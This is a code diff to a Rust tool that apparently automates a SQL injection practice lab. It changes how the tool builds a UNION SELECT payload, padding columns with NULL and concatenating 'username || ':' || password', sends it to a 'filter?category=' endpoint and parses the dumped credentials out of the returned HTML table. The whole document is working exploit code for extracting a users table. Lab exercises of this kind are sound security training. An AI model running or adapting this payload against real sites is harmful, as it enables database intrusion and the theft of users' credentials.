@@ -10,10 +10,6 @@ static TABLE_TH_SELECTOR: LazyLock<Selector> = LazyLock::new(|| {
     Selector::parse("table tbody tr th").expect("Failed to construct the TABLE_TH_SELECTOR")
 });
 
-static TABLE_TD_SELECTOR: LazyLock<Selector> = LazyLock::new(|| {
-    Selector::parse("table tbody tr td").expect("Failed to construct the TABLE_TD_SELECTOR")
-});
-
 fn main() {
     let args = generate_clap_parser();
 
@@ -96,21 +92,26 @@ fn main() {
     );
 
     logger::info("Fetching the `username` and `password` columns from `users` table");
-    logger::info(
-        format!(
-            "Making query: {}/filter?category=' UNION SELECT username, password FROM users--",
-            lab_url
-        )
-        .as_ref(),
-    );
+
+    let payload = (0..columns)
+        .map(|column| {
+            if target_columns.contains(&column) {
+                "username || ':' || password".to_string()
+            } else {
+                "NULL".to_string()
+            }
+        })
+        .collect::<Vec<String>>()
+        .join(", ");
+
+    let query = format!("' UNION SELECT {} FROM users--", payload);
+
+    logger::info(format!("Making query: {}/filter?category={}", lab_url, query).as_ref());
 
     let response = HTTP_CLIENT
-        .get(format!(
-            "{}/filter?category=' UNION SELECT username, password FROM users--",
-            lab_url
-        ))
+        .get(format!("{}/filter?category={}", lab_url, query))
         .send()
-        .expect("[-] ");
+        .expect("[-] Failed to fetch the `username` and `password` columns from `users` table");
 
     if response.status() == 200 {
         let document = Html::parse_document(
@@ -120,19 +121,25 @@ fn main() {
                 .as_ref(),
         );
 
-        let usernames: Vec<String> = document
+        let rows: Vec<String> = document
             .select(&TABLE_TH_SELECTOR)
             .flat_map(|element_ref| element_ref.text())
             .map(str::to_string)
             .collect();
 
-        let passwords: Vec<String> = document
-            .select(&TABLE_TD_SELECTOR)
-            .flat_map(|element_ref| element_ref.text())
-            .map(str::to_string)
-            .collect();
+        let users_hashmap: HashMap<String, String> = rows
+            .into_iter()
+            .filter_map(|row| {
+                let mut parts = row.splitn(2, ':');
 
-        let users_hashmap: HashMap<String, String> = usernames.into_iter().zip(passwords).collect();
+                match (parts.next(), parts.next()) {
+                    (Some(username), Some(password)) => {
+                        Some((username.to_string(), password.to_string()))
+                    }
+                    _ => None,
+                }
+            })
+            .collect();
 
         logger::success("Credentials found in the `users` table:");
 
